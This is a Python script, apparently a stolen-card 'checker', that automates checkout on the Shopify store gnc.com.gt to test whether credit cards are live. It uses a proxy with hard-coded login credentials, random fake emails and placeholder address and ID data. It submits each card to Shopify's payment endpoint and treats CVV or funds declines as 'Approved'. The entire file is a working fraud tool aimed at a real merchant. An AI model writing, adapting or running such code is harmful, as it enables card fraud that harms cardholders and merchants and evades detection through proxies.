import time
import random 
import string
from requests import Session
from retry_requests import retry

def QueryNotice(data):
        try: 
            start = data.index('notice__text">') + len('notice__text">')
            end   = data.index( '<' ,start)
            return       data [start:end]
        
        except: return 'Card was declined'


def shcyber(cc, mes, ano, cvv):
    try:
        session = retry(Session(), retries=5, backoff_factor=0.2)

        https_proxy = 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000'
        proxies = {"http": https_proxy,"https": https_proxy}
        
        session.proxies = proxies

        acii = string.ascii_letters + string.digits
        token = ''.join(random.choice(acii) for i in range(86))
        username = ''.join(random.choices('abcdefghijklmnñopqrstuvwxyz', k=10))
        mail = username + '@gmail.com'
            
        dataa = {'id': '39458081341515'}
        session.get(url='https://gnc.com.gt/cart/add',params= dataa)
        
        req_1 = session.get(url='https://gnc.com.gt/checkout')
        urlch = req_1.url

        data2 = f'_method=patch&authenticity_token={token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D={mail}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bpick_up_in_store%5D%5Bselected%5D=false&checkout%5Bid%5D=delivery-shipping&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=Guatemala&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Aldo+&checkout%5Bshipping_address%5D%5Blast_name%5D=Rafael&checkout%5Bshipping_address%5D%5Baddress1%5D=7a+Avenida+15-45&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Ciudad+de+Guatemala&checkout%5Bshipping_address%5D%5Bprovince%5D=GUA&checkout%5Bshipping_address%5D%5Bzip%5D=12345678-9&checkout%5Bshipping_address%5D%5Bphone%5D=5555+1234&checkout%5Battributes%5D%5Bdpi%5D=1234567890101&checkout%5Battributes%5D%5Blocation%5D=61021356107&checkout%5Battributes%5D%5Blocation_name%5D=Guatemala+-+Zona+1&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=804&checkout%5Bclient_details%5D%5Bbrowser_height%5D=951&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'
        headers = {'Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'}
        session.post(urlch,data2,headers)

        data3 = f'_method=patch&authenticity_token={token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Env%25C3%25ADo%2520a%2520domicilio-20.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=821&checkout%5Bclient_details%5D%5Bbrowser_height%5D=951&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'
        session.post(urlch,data3,headers)

        data4= {"credit_card": {"number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}","name": username,"month": mes,"year": ano,"verification_value": cvv},"payment_session_scope": 'gnc.com.gt'}
        req_2 =session.post(url= 'https://deposit.us.shopifycs.com/sessions', json=data4)
        id_west = req_2.json()['id']
        
        data5 = f'_method=patch&authenticity_token={token}&previous_step=payment_method&step=&s={id_west}&checkout%5Bpayment_gateway%5D=66112782411&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=4050&checkout_submitted_request_url=https%3A%2F%2Fgnc.com.gt%2F26037518411%2Fcheckouts%2F4cef371746e55e44cacd8532b65fa851%3Fprevious_step%3Dshipping_method%26step%3Dpayment_method&checkout_submitted_page_id=58ef169f-F496-4AED-B597-83A6E45265DC&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=804&checkout%5Bclient_details%5D%5Bbrowser_height%5D=951&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'
        req_3 = session.post(urlch, data5)

        time.sleep(4)
        req_4 = session.get(str(req_3.url) + '?from_processing_page=1')
        req_5 = session.get(req_4.url)
        
        resultados = QueryNotice(req_5.text)
        
        if 'Transaction Normal - Insufficient Funds' == resultados: return resultados,'Approved ✅'
        elif 'Data within the transaction is incorrect - Approved' == resultados: return resultados, 'Approved ✅'
        elif 'Street address and postal code do not match' == resultados: return resultados,'Approved ✅'
        elif 'No Match' == resultados: return resultados,'Approved ✅'
        elif 'Invalid card verification number' == resultados: return resultados,'Approved ✅'
        elif 'Charged' == resultados: return resultados,'charged $12.00 ✅'
        elif '/thank_you' in str(req_5.url) or '/orders/' in str(req_5.url) or '/post_purchase' in str(req_5.url): return  'charged $12.00','Approved ✅'
        elif '/3d_secure_2/' in str(req_5.url): return '3d_secure_2'
        elif 'There was a problem processing the payment. Try refreshing this page or check your internet connection.' == resultados: return resultados,'Error => General Decline by shopify'
        else: return resultados,'DECLINED  ❌'
        
    except: return 'Card was declined','DECLINED ❌'



